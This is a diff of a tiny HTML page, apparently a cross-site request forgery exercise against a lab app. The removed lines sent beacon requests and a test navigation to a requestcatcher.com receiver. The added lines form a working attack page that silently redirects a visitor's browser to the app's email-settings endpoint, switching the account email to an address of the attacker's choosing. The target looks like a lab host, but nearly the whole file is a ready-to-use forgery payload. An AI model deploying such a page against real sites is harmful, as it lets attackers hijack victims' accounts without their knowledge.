@@ -1,25 +1,14 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Navigation Test</title>
+    <title>Redirecting</title>
 </head>
 <body>
-    <script>
-        const receiver =
-          "https://tpas-csrf-carlos1261.requestcatcher.com";
-
-        // Confirma que JavaScript empezó.
-        const img = new Image();
-        img.src = receiver + "/?stage=before-navigation";
-
-        // Navegación principal, no subrecurso.
-        setTimeout(() => {
-            window.location.assign(
-                receiver + "/navigation-test?type=top-level"
-            );
-        }, 500);
-    </script>
+<script>
+    window.location.replace(
+        "http://app:8000/settings/email?new=prueba%40example.com"
+    );
+</script>
 </body>
 </html>
